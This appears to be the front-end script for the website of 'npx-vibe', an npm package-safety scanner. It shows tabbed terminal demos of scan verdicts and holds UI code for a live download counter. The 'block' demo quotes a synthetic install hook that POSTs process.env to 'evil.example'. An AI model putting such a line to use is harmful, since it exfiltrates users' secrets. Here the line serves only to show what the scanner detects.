const demos = {
  approve: `$ npx npx-vibe approve-scripts
! npx-vibe approve-scripts: 2 need review
my-app@1.0.0

Dependencies with install scripts: 4  Already allowed: 2
Reviewed now: 2  approve 0  review 2  deny 0

REVIEW   better-sqlite3@11.10.0
  install: prebuild-install || node-gyp rebuild --release
  Install scripts run commands that no automatic rule recognises.

REVIEW   esbuild@0.28.2
  postinstall: node install.js
  network_and_shell: Code combines network access with shell execution.
  Evidence install.js:147: function fetch(url) {
    ... https.get(url, (res) => {
  Evidence install.js:187: child_process.execSync(
    \`npm install --loglevel=error ... \${pkg}@\${packageJSON.version}\`)

No install script was executed during this review.
2 package(s) need a human decision; --write never records those.`,

  scan: `$ npx npx-vibe vite
npx-vibe: Proceed  risk 5/100
vite@7.1.7
Native-ESM powered web dev build tool

Downloads: 38,410,225/week  Package age: 2331d  Version age: 10d
Known advisories: none found (OSV)
Install hooks: none
Inspected: 4 selected files from 36 package files
Established signals: long registry history, high weekly adoption,
linked GitHub repository

Registry context (not scored):
- young_version: This version was published 10 days ago.

Action: nothing blocking found. Run it with: npx-vibe run vite`,

  advisory: `$ npx npx-vibe lodash@4.17.15
! npx-vibe: Caution  risk 55/100
lodash@4.17.15

Known advisories: 6 (OSV)
Install hooks: none

Findings:
- HIGH     known_vulnerability
  6 known advisories for lodash@4.17.15:
  GHSA-35jh-r3h4-6jhm (CVE-2021-23337) HIGH;
  GHSA-p6mc-m468-83gw (CVE-2020-8203) HIGH; and 4 more.
  Evidence: Command Injection in lodash

Action: read the evidence above before running this package.`,

  agent: `$ npx npx-vibe --agent esbuild
{
  "schemaVersion": 2,
  "tool": { "name": "npx-vibe", "version": "2.0.0" },
  "kind": "package-scan",
  "status": "complete",
  "decision": {
    "verdict": "caution",
    "riskScore": 42,
    "action": "review",
    "exitCode": 2,
    "mayContinue": false,
    "safeToExecute": false,
    "requiresApproval": true,
    "blocked": false,
    "mustStop": false
  }
}`,

  block: `$ npx npx-vibe sketchy-package
npx-vibe: Block  risk 100/100
fixture: install-time secret exfiltration

Install hooks: postinstall

Findings:
- CRITICAL possible_secret_exfiltration in postinstall.js
  Code reads environment/secrets and sends data over the
  network from the same code path.
  Evidence line 1: fetch("https://evil.example/collect",
  { method: "POST", body: JSON.stringify(process.env) })

Action: blocked. npx-vibe run sketchy-package --force
overrides this deliberately.`
};

const demoMeta = {
  approve: "npm 12 blocks install scripts until you allow them. This is the review that tells you which ones deserve it, with the source line behind each decision.",
  scan: "The default command reviews and exits. Age and adoption are shown as context and never move the score.",
  advisory: "Known advisories come from OSV with no API key. A published CVE raises Caution; it never forces a Block on its own.",
  agent: "Agent mode returns schema-versioned JSON, disables local history writes, and pauses the workflow on Caution.",
  block: "A synthetic fixture. Critical findings require the secret read and the network call to sit on the same code path.",
};


const output = document.querySelector("#demo-output");
const note = document.querySelector("#demo-note");
const tabs = [...document.querySelectorAll(".demo-tab")];
const terminalPanel = document.querySelector(".terminal-panel");
const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

function setDemo(name) {
  if (!output || !demos[name]) return;

  output.textContent = demos[name];
  if (note) note.textContent = demoMeta[name];

  if (terminalPanel && !reduceMotion) {
    terminalPanel.classList.remove("is-switching");
    void terminalPanel.offsetWidth;
    terminalPanel.classList.add("is-switching");
  }

  tabs.forEach((tab) => {
    const active = tab.dataset.demo === name;
    tab.classList.toggle("active", active);
    tab.setAttribute("aria-selected", String(active));
  });
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => setDemo(tab.dataset.demo));
});

tabs.forEach((tab, index) => {
  tab.addEventListener("keydown", (event) => {
    const keys = ["ArrowLeft", "ArrowRight", "Home", "End"];
    if (!keys.includes(event.key)) return;

    event.preventDefault();
    let nextIndex = index;
    if (event.key === "ArrowLeft") nextIndex = (index - 1 + tabs.length) % tabs.length;
    if (event.key === "ArrowRight") nextIndex = (index + 1) % tabs.length;
    if (event.key === "Home") nextIndex = 0;
    if (event.key === "End") nextIndex = tabs.length - 1;

    const nextTab = tabs[nextIndex];
    setDemo(nextTab.dataset.demo);
    nextTab.focus();
  });
});

setDemo("proceed");

const siteHeader = document.querySelector(".site-header");

function updateHeader() {
  siteHeader?.classList.toggle("is-scrolled", window.scrollY > 12);
}

updateHeader();
window.addEventListener("scroll", updateHeader, { passive: true });

const revealItems = [...document.querySelectorAll("[data-reveal]")];

if (!reduceMotion && "IntersectionObserver" in window && revealItems.length) {
  // Only hide content once we know we can reveal it again. If this script fails
  // to load, nothing is ever hidden and the page reads normally.
  document.documentElement.classList.add("reveal-on");

  const revealObserver = new IntersectionObserver(
    (entries, observer) => {
      entries.forEach((entry) => {
        // A fast scroll can take an element from below the fold to above it
        // between frames, so anything already past the top counts as seen.
        if (!entry.isIntersecting && entry.boundingClientRect.top > 0) return;
        entry.target.classList.add("is-visible");
        observer.unobserve(entry.target);
      });
    },
    { rootMargin: "0px 0px -8% 0px", threshold: 0 },
  );

  revealItems.forEach((item) => revealObserver.observe(item));
}

document.querySelectorAll("[data-copy]").forEach((button) => {
  const defaultText = button.textContent;

  button.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(button.dataset.copy);
      button.textContent = "Copied";
    } catch {
      button.textContent = "Copy failed";
    }

    setTimeout(() => {
      button.textContent = defaultText;
    }, 1300);
  });
});

// The named windows (last-week, last-month) lag several days behind, so the
// counter read as stale even though it was live. An explicit date range returns
// the recent days, and we sum the most recent seven that actually have data.
const DOWNLOAD_RANGE_DAYS = 14;

function downloadsUrl() {
  const day = 86400000;
  const iso = (date) => date.toISOString().slice(0, 10);
  const end = new Date(Date.now());
  const start = new Date(end.getTime() - DOWNLOAD_RANGE_DAYS * day);
  return `https://api.npmjs.org/downloads/range/${iso(start)}:${iso(end)}/npx-vibe`;
}
const numberFormatter = new Intl.NumberFormat("en-US");

function animateNumber(element, total) {
  const finalText = numberFormatter.format(total);

  // requestAnimationFrame is paused in a hidden or background tab, so animating
  // there leaves the placeholder on screen forever. The number matters; the
  // count-up does not.
  if (reduceMotion || document.hidden || typeof requestAnimationFrame !== "function") {
    element.textContent = finalText;
    return;
  }

  const duration = 700;
  const startedAt = performance.now();
  const step = (now) => {
    const progress = Math.min(1, (now - startedAt) / duration);
    if (progress >= 1) {
      element.textContent = finalText;
      return;
    }
    const eased = 1 - (1 - progress) ** 3;
    element.textContent = numberFormatter.format(Math.round(total * eased));
    requestAnimationFrame(step);
  };

  requestAnimationFrame(step);
  // Backstop for a tab hidden mid-animation, which pauses the frames.
  setTimeout(() => {
    element.textContent = finalText;
  }, duration + 300);
}

async function fetchJson(url, timeoutMs) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, {
      headers: { accept: "application/json" },
      signal: controller.signal,
    });
    if (!response.ok) throw new Error(`npm API returned ${response.status}`);
    return await response.json();
  } finally {
    clearTimeout(timeout);
  }
}

function applyTotal(total, from, to) {
  if (!total) return false;
  document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
    animateNumber(element, total);
    element.setAttribute(
      "title",
      `${numberFormatter.format(total)} downloads from ${from} through ${to}`
    );
  });
  return true;
}

async function refreshDownloads() {
  // Preferred: an explicit range, because npm's named windows lag several days.
  try {
    const payload = await fetchJson(downloadsUrl(), 12000);
    const days = Array.isArray(payload.downloads) ? payload.downloads : [];
    const counted = [...days];
    // Trailing zero days are "not counted yet" rather than a real zero.
    while (counted.length && Number(counted[counted.length - 1].downloads || 0) === 0) {
      counted.pop();
    }
    const week = counted.slice(-7);
    const total = week.reduce((sum, day) => sum + Number(day.downloads || 0), 0);
    if (applyTotal(total, week[0]?.day, week[week.length - 1]?.day)) return;
  } catch (error) {
    console.warn("Range download lookup failed, falling back:", error.message);
  }

  // Fallback: the named window. Older data, but better than a placeholder.
  try {
    const payload = await fetchJson("https://api.npmjs.org/downloads/point/last-week/npx-vibe", 8000);
    applyTotal(Number(payload.downloads || 0), payload.start, payload.end);
  } catch (error) {
    console.warn("Could not refresh npm download count:", error.message);
  }
}

refreshDownloads();
